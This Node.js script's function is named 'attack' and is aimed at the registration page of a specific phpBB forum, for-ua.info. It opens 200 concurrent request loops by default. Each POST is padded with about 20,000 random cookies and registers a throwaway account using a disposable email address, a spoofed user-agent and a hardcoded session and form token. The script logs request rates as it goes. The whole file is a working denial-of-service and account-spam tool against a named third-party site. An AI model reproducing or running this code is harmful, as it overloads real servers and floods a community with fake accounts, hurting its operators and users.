const http = require('http');
const constants = require('../list');
const _ = require('underscore');
const qs = require('querystring');

var requestsCount = 0;
var loadTimeSum = 0;
var loadDataAmount = 0;

var cookies = {};

const cookiesSize = +process.argv[process.argv.length - 1] || 20000;
const threadsCount = +process.argv[process.argv.length - 2] || 200;

for(let i = 0; i < cookiesSize; i++) {
  cookies['phpbb3_' + i] = _.random(1, 1000 * 1000 * 1000 * 1000).toString(2)
}

cookies = qs.encode(cookies, '; ') + 'phpbb3_dfg23_u=1; phpbb3_dfg23_k=; phpbb3_dfg23_sid=0d023aa521d3e041beb18633a9c0bef2; _gat=1; _ym_uid=147321962228649464; _ym_isad=1; _ga=GA1.2.1422368805.1473219621';
console.log(cookies.length / 1024);

function headers() {
  return {
    'user-agent': constants.browser(),
    'referer': 'http://for-ua.info/ucp.php?mode=register',
    'cache-control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ru,en-US;q=0.8,en;q=0.6',
    'Cookie': cookies
  }
}

function attack(path) {
  if (!path) {
    path = 'http://for-ua.info/ucp.php?mode=register';
  }
  const start = Date.now();
  const req = http.request({
    host: 'for-ua.info',
    method: 'POST',
    path: path,
    headers: headers(),
  }, function (res) {
    if ([200, 307, 404].indexOf(res.statusCode) < 0) {
      console.warn(res.statusCode);
    }
    function logResponse() {
      requestsCount++;
      loadTimeSum += Date.now() - start;
      setTimeout(attack, 0)
    }

    // if (307 === res.statusCode) {
    //   logResponse();
    //   attack(res.headers.location);
    // }
    if ('content-length' in res.headers) {
      res.on('data', function (chuck) {
        loadDataAmount += chuck.length
      });
      res.on('end', logResponse);
    }
    else {
      logResponse();
    }
  });
  req.on('error', function (err) {
    console.error('Request error', err);
  });
  const now = process.hrtime();
  const username = (now[0] * 1000 * 1000 * 1000 + now[1]).toString(36);
  const data = {
    username: username,
    email: username + '@yopmail.com',
    email_confirm: username + '@yopmail.com',
    new_password: username + '2005',
    password_confirm: username + '2005',
    lang: 'ru',
    tz: 2,
    agreed: true,
    change_lang: 0,
    qa_answer: username,
    qa_confirm_id: '8689d86e4e4a29eacc20b551304e26a1',
    creation_time: 1473219931,
    form_token: '28cca212dae3aec858604966f02046c17ce0de5d'
  };
  req.write(qs.encode(data));
  req.end();
}

setInterval(function () {
  const time = new Date().toLocaleString();
  const loading = Math.round(loadTimeSum / requestsCount);
  console.log(`# ${time} # ${loading} # ${requestsCount} / ${(loadDataAmount / 1024).toPrecision(2)}`);
  loadTimeSum = 0;
  requestsCount = 0;
  loadDataAmount = 0;
}, 10000);

for (var i = 0; i < threadsCount; i++) {
  setTimeout(attack, _.random(1, i * 50));
}
